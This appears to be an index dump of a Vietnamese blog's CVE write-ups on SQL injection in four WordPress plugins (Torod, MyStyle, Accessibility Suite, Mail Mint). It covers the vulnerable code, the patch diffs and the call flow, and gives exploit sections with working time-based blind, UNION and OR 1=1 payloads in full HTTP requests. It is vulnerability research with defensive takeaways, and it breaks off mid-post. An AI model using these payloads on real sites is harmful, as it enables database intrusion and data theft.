","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Sink\rCVE này không có bản vá nên không thể sử dụng diff tool để so sánh sự khác biệt giữa code lỗi và code đã fix lỗi. Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global $wpdb, ta search từ khóa này trong thư mục của plugin để tìm sink. Tìm vị trí sink trong code 👉 Dữ liệu từ $_POST['country_id'] được đưa thẳng vào truy vấn SQL mà không có cơ chế kiểm soát hợp lệ. Việc chỉ sử dụng sanitize_text_field() mới dừng lại ở mức escape chuỗi, chứ không đảm bảo tính an toàn. Do đó, lỗ hổng SQLi có thể xảy ra. Source: $_POST['country_id'] Sink: $wpdb-\u003eget_results(\"SELECT * FROM $table_name WHERE country_id = $country_id\") ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#vulnerable-sink"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rLỗ hổng nằm trong hàm get_regions_and_cities của class ajaxyk thuộc file inc/ajaxyk.php. Để xác định nơi nó được gọi, ta tìm kiếm với từ khóa get_regions_and_cities trong thư mục chứa plugin. Tìm vị trí hàm get_regions_and_cities 👉 get_regions_and_cities được construct của class ajaxyk gọi làm callback của 2 action hook thông qua hàm add_action wp_ajax_get_regions_and_cities Được viết theo cú pháp wp_ajax_{$action} Yêu cầu người dùng đăng nhập wp_ajax_nopriv_get_regions_and_cities Được viết theo cú pháp wp_ajax_nopriv_{$action} Không yêu cầu người dùng đăng nhập Vì đây là lỗ hổng unauthenticated nên ta chỉ quan tâm tới hook wp_ajax_nopriv_get_regions_and_cities. Như vậy khi gửi POST request đến /wp-admin/admin-ajax.php với tham số action=wp_ajax_nopriv_get_regions_and_cities\u0026country_id=payload_here Callback get_regions_and_cities được gọi. country_id được lấy trực tiếp từ request và chèn vào SQL query. Query thực thi với payload độc hại. ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect SQLi\rGửi POST request chứa payload SQLi. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi đó câu query sẽ trở thành: SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) Kết quả phản hồi thời gian 👉 Dựa trên thời gian phản hồi =\u003e payload hoạt động. Các technique có thể sử dụng trong trường hợp table rỗng: UNION: vì nó không phụ thuộc vào dữ liệu bảng của câu query trước đó, nhưng cần phải tìm được số cột tương ứng. Subquery: Subquery trong mệnh đề WHERE: MySQL có thể tối ưu hóa và bỏ qua subquery nếu kết quả có thể xác định sớm. Nếu bảng không có dữ liệu, kết quả cuối cùng sẽ là tập rỗng, MySQL không cần thực thi SLEEP(). Subquery trong mệnh đề FROM: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính. Thứ tự thực thi truy vấn SQL ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#detect-sqli"},{"categories":["CVE Analyst"],"collections":null,"content":"Get First Letter of Database Name\rĐiều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được. Gửi request với SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Sử dụng SUBSTRING() để lấy ký tự đầu tiên của database name, IF() trả về SLEEP(5) nếu ký tự đó là 0x77(‘w’) Sử dụng hex encoding w thành 0x77 vì country_id được lấy từ POST request trong nên bị escape bởi magic quotes trong WordPress và bởi sanitize_text_field. 👉 Dựa trên thời gian phản hồi =\u003e kí tự đầu tiên đúng là w. ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#get-first-letter-of-database-name"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-30936 trong plugin WordPress Torod từ phiên bản 1.9 trở lại, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection. Chưa có bản vá chính thực nào cho lỗ hổng này. Key takeaways: Kiểm soát kỹ input từ người dùng. Luôn sử dụng $wpdb-\u003eprepare() khi làm việc với database trong WordPress để tránh SQL Injection. Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công. ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Torod Plugin \u003c= 1.9 is vulnerable to SQL Injection ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng tồn tại trong plugin MyStyle Custom Product Designer của WordPress trước phiên bản 3.21.2. Lỗ hổng này cho phép kẻ tấn công tương tác trực tiếp với cơ sở dữ liệu, bao gồm khả năng trích xuất hoặc thao túng dữ liệu. CVE ID: CVE-2025-48281 Sản phẩm: WordPress MyStyle Custom Product Designer Plugin Loại lỗ hổng: SQL Injection Phiên bản bị ảnh hưởng: \u003c= 3.21.1 Mức độ nghiêm trọng (CVSS): Cao (9.3) Yêu cầu đặc quyền: Không cần xác thực ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. MyStyle Custom Product Designer: v3.21.1 (có lỗ hổng) và v3.21.2 (đã vá) Công cụ diff: meld hoặc bất kỳ công cụ so sánh phiên bản nào WooCommerce plugin: phải được kích hoạt trước khi cài đặt MyStyle vì plugin này sử dụng một số hàm từ WooCommerce ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rNguyên nhân chính là việc ứng dụng chèn trực tiếp dữ liệu từ tham số GET vào câu truy vấn SQL mà không có biện pháp xác thực hợp lệ. ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDưới đây là sự khác biệt giữa hai phiên bản (3.21.1 và 3.21.2) trong file includes/entities/class-mystyle-designmanager.php. So sánh bản vá Bản vá mới đã thêm danh sách whitelist $allowed_orderby để chỉ cho phép sắp xếp theo các cột hợp lệ. Nếu giá trị orderby không nằm trong danh sách, nó sẽ tự động bị thay thế bằng 'ms_design_id', ngăn chặn chèn mã độc SQL. ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it works\rLỗ hổng nằm trong hàm get_designs thuộc class MyStyle_DesignManager (file includes/entities/class-mystyle-designmanager.php). Hàm này được gọi bởi các hàm như get_items, init_index_request, và một số hàm kiểm thử. Kết quả tìm kiếm get_designs Vì đây là lỗ hổng unauthenticated, cần xác định hàm nào có thể được gọi mà không yêu cầu đăng nhập. Kết quả cho thấy chỉ có init_index_request có thể bị khai thác trực tiếp qua URL /designs/. Luồng tấn công logic ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#how-it-works"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Kiểm tra SQLi\rGửi request chứa payload SQLi để kiểm tra: GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Câu truy vấn kết quả: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 Nếu phản hồi chậm 5 giây → payload hoạt động. Kiểm tra độ trễ thời gian Không thêm dấu comment (--) sau SLEEP() vì sẽ khiến SQL parser lỗi do xuống dòng giữa ASC và OFFSET. Debug lỗi ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:4:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#kiểm-tra-sqli"},{"categories":["CVE Analyst"],"collections":null,"content":"Lấy ký tự đầu tiên của tên cơ sở dữ liệu\rGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here Nếu phản hồi chậm → ký tự đầu tiên của tên database là w. Kỹ thuật này có thể được mở rộng để trích xuất toàn bộ tên cơ sở dữ liệu hoặc bảng dữ liệu. ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:4:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#lấy-ký-tự-đầu-tiên-của-tên-cơ-sở-dữ-liệu"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-48281 trong plugin MyStyle Custom Product Designer (\u003c= 3.21.1) xuất phát từ việc đưa trực tiếp dữ liệu người dùng vào truy vấn SQL mà không xác thực đúng cách. Bản vá 3.21.2 đã khắc phục bằng cách áp dụng danh sách cột cho phép (whitelist) và kiểm tra giá trị đầu vào. Bài học rút ra: Luôn xác thực dữ liệu đầu vào. Khi làm việc với cơ sở dữ liệu trong WordPress, bắt buộc dùng $wpdb-\u003eprepare(). Thường xuyên cập nhật plugin để tránh trở thành mục tiêu tấn công. ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection Cheat Sheet - PortSwigger WordPress MyStyle Custom Product Designer Plugin \u003c= 3.21.1 SQL Injection ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:6:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Accessibility Suite Plugin.","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Accessibility Suite của WordPress trước phiên bản 4.19. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Accessibility Suite: v4.18(vul) và v4.19(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rỨng dụng chưa thực hiện ép kiểu cho input và mặc dù có sử dụng prepare() để chống SQLi, nhưng do triển khai không đúng nên lỗ hổng SQLi vẫn tồn tại. ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/classes/Helper.php static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $list = json_decode( $wpdb-\u003eget_results($wpdb-\u003eprepare(\"SELECT list FROM $table_name WHERE scan_id = $scan_id\"))[0]-\u003elist // phpcs:ignore ); } Bản vá đã truyền $scan_id như tham số vào câu query. SQL injection được phòng ngừa vì biến không được nối trực tiếp vào query nữa. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\"status\" =\u003e \"failed\", \"msg\" =\u003e \"Invalid scan ID\"]; } // Get list using properly prepared query $query = $wpdb-\u003eprepare( \"SELECT list FROM %i WHERE scan_id = %d\", $table_name, $scan_id ); $result = $wpdb-\u003eget_results($query); } Patch diff ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rLỗ hổng nằm trong hàm tĩnh save_false_positive của class Helper thuộc file includes/classes/Helper.php. Để xác định nơi nó được gọi, ta tìm kiếm với tự khóa save_false_positive trong thư mục chứa plugin. Search save_false_positive 👉 save_false_positive được callback của action hook wp_ajax_ONLINE_ADAv4/save_false_positive gọi. Khi POST request được gửi đến /wp-admin/admin-ajax.php với action=ONLINE_ADAv4/save_false_positive callback được gọi. Trong request cần 2 POST param issue_id và scan_id. Nếu không, ứng dụng sẽ trả về: save_false_positive được gọi với đối số issue_id và scan_id. Các đối số này sẽ bị escape bởi magic quotes trong WordPress vì lấy trực tiếp từ POST request. Ứng dụng check xem người dùng có quyền truy cập vào trang admin không. Nếu không, trả về chuỗi rỗng. if(! is_admin()) { return ''; } Sau đó các đối số trực tiếp truyền vào câu query chứa lỗ hổng SQLi rồi thực thi. ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect SQLi\rGửi POST request chứa payload SQLi. Vì chỉ cần là user có quyền truy cập vào trang admin, nên ta tạo user với role:subcriber có privilege thấp nhất. Trong WordPress, user có role cao hơn sẽ kế thừa cả privilege role thấp hơn. Nên chỉ cần user subcriber gửi payload thành công thì tất cả user còn lại đều có thể. Đúng với mô tả của CVE POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT SLEEP(5) Khi đó câu query sẽ trở thành SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) Time response with SQLi payload 👉 Dựa trên thời gian phản hồi =\u003e payload hoạt động. Các technique có thể sử dụng trong trường hợp table rỗng: UNION: vì nó không phụ thuộc vào dữ liệu bảng của câu query trước đó, nhưng cần phải tìm được số cột tương ứng với truy vấn trước đó. Subquery: Subquery trong mệnh đề WHERE: MySQL có thể tối ưu hóa và bỏ qua subquery nếu kết quả có thể xác định sớm. Nếu bảng không có dữ liệu, kết quả cuối cùng sẽ là tập rỗng, MySQL không cần thực thi SLEEP(). Subquery trong mệnh đề FROM: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính. SQL Execution Order Diagram ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#detect-sqli"},{"categories":["CVE Analyst"],"collections":null,"content":"Get First Letter of Database Name\rĐiều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được. Gửi request với SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) Sử dụng SUBSTRING() để lấy ký tự đầu tiên của database name, IF() trả về SLEEP(5) nếu ký tự đó là 0x77(‘w’) Sử dụng hex encoding w thành 0x77 vì như phân tích ở trên, scan_id sẽ bị escape. 👉 Dựa trên thời gian phản hồi =\u003e kí tự đầu tiên đúng là w. ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#get-first-letter-of-database-name"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-32650 trong plugin WordPress Accessibility Suite trước phiên bản 4.19 xuất phát từ việc triển khai không đúng hàm $wpdb-\u003eprepare() dẫn đến lỗ hổng SQL Injection. Bản vá chính thức đã triển khai đúng $wpdb-\u003eprepare, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn. Key takeaways: Luôn sử dụng $wpdb-\u003eprepare() khi làm việc với database trong WordPress để tránh SQL Injection. Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công. ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Accessibility Suite Plugin \u003c= 4.18 is vulnerable to SQL Injection ","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Mail Mint Plugin.","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Mail Mint của WordPress trước phiên bản 1.18.6. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Mail Mint: v1.18.5(vul) và v1.18.6(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rỨng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà không sử dụng các biện pháp bảo vệ khiến lỗ hổng SQL Injection xảy ra. ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file /app/Utilities/Helper/Import.php public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"')\"; $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \"SELECT user_id FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"') GROUP BY user_id LIMIT $number OFFSET $offset\"; $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Bản vá sử dụng $wpdb-\u003eprepare() thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u003eprepare( \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders)\", $keys ); $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026 OFFSET (safe with prepare) $final_query = $wpdb-\u003eprepare( \"SELECT user_id FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\", array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Patch Diff ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rLỗ hổng nằm trong hàm get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) của class Import. Để xác định nơi nó được gọi, ta tìm kiếm với tự khóa get_wp_users_by_learndash_with_limit_offset trong thư mục chứa plugin. Search Import Kết quả cho thấy hàm này được gọi trong: retrieve_contacts_associated_with_learndash() perform_learndash_user_import() thuộc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php. Tiếp theo, để xác định nơi retrieve_contacts_associated_with_learndash() được sử dụng, ta tìm kiếm từ khóa retrieve_contacts_associated_with_learndash trong thư mục plugin. Search 1 Hàm này được gọi trong map_contacts_with_learndash() thuộc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php. Tiếp tục tìm kiếm từ khóa map_contacts_with_learndash để xem hàm này được đăng ký ở đâu: Search 2 Ta phát hiện rằng nó được dùng làm callback của REST API thông qua hàm register_rest_route() trong WordPress: class ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u003enamespace, // mrm/v1 $this-\u003erest_base . '/learndash/map', // contacts/import/learndash/map/ array( array( 'methods' =\u003e WP_REST_Server::CREATABLE, // POST 'callback' =\u003e array( $this-\u003econtroller, 'map_contacts_with_learndash' ), 'permission_callback' =\u003e PermissionManager::current_user_can('mint_manage_contacts'), // Admin 'args' =\u003e array( 'selectedCourses' =\u003e array( 'description' =\u003e __( 'The selected courses from which to import contacts.', 'mrm' ), 'required' =\u003e true, 'type' =\u003e 'array', 'sanitize_callback' =\u003e 'rest_sanitize_array', ) ), // array + required ), ) ); // other logic } // other logic } Luồng gọi hàm: POST /wp-json/mrm/v1/contacts/import/learndash/map được gửi tới REST API cùng tham số bắt buộc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) là callback được gọi: Nhận $request làm tham số đầu vào. Lấy các tham số của $request chuyển thành mảng $params Callback gọi retrieve_contacts_associated_with_learndash() với đối số là $params. retrieve_contacts_associated_with_learndash() gọi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys là một mảng được tạo ra bằng cách lấy tất cả giá trị value trong $courses, sau đó ghép chuỗi theo mẫu course_{COURSE_ID}_access_from Trước khi đưa vào câu query, mảng $keys được nối thành một chuỗi bằng hàm implode(). Nếu $keys chỉ có một phần tử, kết quả của implode() chính là giá trị chuỗi của phần tử đó. Thực thi query, trả về JSON chứa formatted_users + total_users ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\rSau khi phân tích, ta thấy tham số selectedCourses được xử lý qua nhiều logic trước khi truyền vào query chứa SQLi, quan trọng ta vẫn kiểm soát được giá trị của key value. POST request qua BurpSuite: Ta gửi request với một key duy nhất =\u003e dễ dàng kiểm soát câu query. Get all user info Khi đó, câu query trở thành: SELECT user_id FROM wp_usermeta WHERE meta_key IN ('course_abc') OR 1=1 -- _access_from') GROUP BY user_id LIMIT 5 OFFSET 0 ') thoát khỏi IN 1=1 luôn đúng =\u003e trả về tất cả user_id trong wp_usermeta Đoạn code còn lại trong get_wp_users_by_learndash_with_limit_offset sẽ truy vấn meta thông tin của tất cả user trả về: $formatted_users = array_map( function ($user) { $user-\u003eusermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u003eID) ); return $user; }, $contacts ); ","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 